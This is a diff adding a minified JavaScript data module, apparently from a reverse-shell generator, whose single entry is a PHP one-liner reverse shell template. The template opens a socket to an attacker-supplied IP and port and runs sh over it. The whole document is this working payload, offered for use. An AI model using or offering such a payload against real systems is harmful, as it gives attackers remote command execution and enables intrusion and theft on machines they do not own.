@@ -1,0 +1,1 @@
+const e=[{title:"PHP Shell_exec Reverse Shell",template:`php -r '$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");'`,description:"PHP one-liner reverse shell using shell_exec function."}],l={commands:e};export{e as commands,l as default};
